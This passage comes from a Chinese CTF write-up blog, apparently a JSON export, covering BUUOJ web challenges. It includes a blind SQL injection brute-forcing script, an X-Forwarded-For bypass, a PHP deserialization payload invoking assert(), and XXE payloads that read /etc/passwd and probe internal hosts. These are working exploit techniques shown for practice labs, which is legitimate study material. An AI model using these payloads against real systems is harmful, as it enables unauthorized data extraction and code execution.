number\">126</span>\n    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n    <span class=\"token keyword\">while</span> begin <span class=\"token operator\">&lt;</span> end<span class=\"token punctuation\">:</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 延时操作</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>begin<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)</span>\n        <span class=\"token comment\"># url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1nal1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)</span>\n       <span class=\"token comment\"># url = \"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1naI1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)\".format(i, mid)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(r.text)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'Click others'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>           <span class=\"token comment\"># 布尔判断成立的时候的情况</span>\n            begin <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            end <span class=\"token operator\">=</span> mid\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n\n    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 退出使的判断会多做一次，导致mid比实际的要大1</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行脚本爆出数据库为geek</p>\n<p>爆出表名有F1naI1y,Flaaaaag</p>\n<p>Flaaaaag内的字段有id,fl4gawsl</p>\n<p>flag没有在fl4gawsl中。</p>\n<p>F1naI1y中有字段 id,username,password</p>\n<p>查看用户密码</p>\n<p>在password中的最后一个可以爆出flag</p>\n<h2 id=\"MRCTF2020-PYWebsite\"><a href=\"#MRCTF2020-PYWebsite\" class=\"headerlink\" title=\"[MRCTF2020]PYWebsite\"></a>[MRCTF2020]PYWebsite</h2><p><strong>考点：XXF、签到题</strong></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enc</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      hash <span class=\"token operator\">=</span> <span class=\"token function\">hex_md5</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> hash<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">var</span> code <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vcode\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex_md5</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"0cd4da0223c0b280829dc3ea458d655c\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"您通过了验证！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          window<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">\"./flag.php\"</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你的授权码不正确！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入授权码\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      \n    <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>直接去访问flag.php，提示</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">我已经把购买者的IP保存了，显然你没有购买\n\n验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>所以尝试添加一个http头xxf试试，直接获得flag</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131184223167.png\" alt=\"image-20210131184223167\"></p>\n<h2 id=\"NPUCTF2020-ReadlezPHP\"><a href=\"#NPUCTF2020-ReadlezPHP\" class=\"headerlink\" title=\"[NPUCTF2020]ReadlezPHP\"></a>[NPUCTF2020]ReadlezPHP</h2><p><strong>考点：PHP反序列化</strong></p>\n<p>查看源码，发现./time.php?source，访问看看，得到源码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">#error_reporting(0);</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloPhp</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Y-m-d h:i:s\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"date\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HelloPhp</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n@<span class=\"token variable\">$ppp</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看一下应该是要做反序列化，data是序列化字符传入点，在析构函数处存在一个字符串嵌套来实现函数执行的点，就是利用点了。</p>\n<p>eval和system()函数都没有成功，但是可以使用assert()函数，断言函数是用于，*assert()<em>可以将整个字符串参数当作php参数执行，而类似的</em>eval()*函数是执行合法的php代码。</p>\n<p>所以使用exp:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n#error_reporting(0);\nclass HelloPhp\n&#123;\n    public $a;\n    public $b;\n    public function __construct()&#123;\n        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;\n        $this-&gt;b &#x3D; &quot;date&quot;;\n    &#125;\n    public function __destruct()&#123;\n        $a &#x3D; $this-&gt;a;\n        $b &#x3D; $this-&gt;b;\n        echo $b($a);\n    &#125;\n&#125;\n$c &#x3D; new HelloPhp;\n$c-&gt;a &#x3D; &quot;phpinfo()&quot;;\n$c-&gt;b &#x3D; &quot;assert&quot;;\n$d &#x3D; serialize($c);\nvar_dump($d);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>payload:</p>\n<p><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p>\n<h2 id=\"NCTF2019-True-XML-cookbook\"><a href=\"#NCTF2019-True-XML-cookbook\" class=\"headerlink\" title=\"[NCTF2019]True XML cookbook\"></a>[NCTF2019]True XML cookbook</h2><p>考点：xxe</p>\n<p>burp抓包查看信息，发现了xml形式的账号密码格式，我们尝试进行xxe</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">alan</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>password</span><span class=\"token punctuation\">></span></span>\npassword\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>password</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>/flag是不存在的，那么现收集一下信息，passwd看完了，看一下hosts文件。</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">alan</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"file:///etc/hosts\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>password</span><span class=\"token punctuation\">></span></span>\npassword\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>password</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>没有发现有用的ip地址，再看一下/proc/net/arp</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131203036898.png\" alt=\"image-20210131203036898\"></p>\n<p>可以发现10.99.142.2、和10.128.0.1两个IP地址。</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">alan</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"http://10.99.142.2/\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>password</span><span class=\"token punctuation\">></span></span>\npassword\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>password</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>访问失败，显示连接被拒绝，使用burp的intruder去扫一下C段，看看存活主机。</p>\n<p>找到了10.99.142.11是可以访问的，成功获取到flag。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131203717131.png\" alt=\"image-20210131203717131\"></p>\n<h2 id=\"Misc-ningen\"><a href=\"#Misc-ningen\" class=\"headerlink\" title=\"[Misc]ningen\"></a>[Misc]ningen</h2><p>binwalk分析图片，发现存在zip后，binwalk分离文件，然后使用压缩包爆破工具爆出密码，解压获取flag</p>\n","text":"[BSidesCF 2020]Had a bad day考点：PHP伪协议 这题上来就是一个选择，选择的内容是在url处category参数处，输入一个单引号，引发php报错。由此可以知道url传入的参数会先与”.php”进行拼接，然后使用include()来包含。 这里想要直接...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":13,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BSidesCF-2020-Had-a-bad-day\"><span class=\"toc-text\">[BSidesCF 2020]Had a bad day</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">[BJDCTF 2nd]简单注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E\"><span class=\"toc-text\">[WUSTCTF2020]朴实无华</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap\"><span class=\"toc-text\">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL\"><span class=\"toc-text\">[极客大挑战 2019]FinalSQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-PYWebsite\"><span class=\"toc-text\">[MRCTF2020]PYWebsite</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NPUCTF2020-ReadlezPHP\"><span class=\"toc-text\">[NPUCTF2020]ReadlezPHP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NCTF2019-True-XML-cookbook\"><span class=\"toc-text\">[NCTF2019]True XML cookbook</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Misc-ningen\"><span class=\"toc-text\">[Misc]ningen</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"HGAME2021部分","uid":"c9ebdc7b707001d9ef85b7974ab1c1e5","slug":"HGAME2021","date":"2021-01-31T13:25:26.000Z","updated":"2021-03-29T08:46:31.488Z","comments":true,"path":"api/articles/HGAME2021.json","keywords":"A1andNS","cover":null,"text":"WEBHitchhiking_in_the_Galaxy考点：HTTP头部信息 访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为https://cardinal.ink/，...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"HGAME 2021","slug":"HGAME-2021","count":1,"path":"api/tags/HGAME-2021.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Docker简单入门","uid":"804c228705dc2bd8721e58f306185d36","slug":"Docker简单入门","date":"2021-01-21T05:36:40.000Z","updated":"2021-01-21T12:31:51.000Z","comments":true,"path":"api/articles/Docker简单入门.json","keywords":"A1andNS","cover":null,"text":"what is Docker?Docker是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台中。比如，你在本地用Python开发网站后台，开发测试完成后，就可以将Python3及其依赖包、Flask及其各种插件、Mysql、Ngi...","link":"","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[{"name":"Docker","slug":"Docker","count":1,"path":"api/categories/Docker.json"}],"tags":[{"name":"Dcoker","slug":"Dcoker","count":1,"path":"api/tags/Dcoker.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}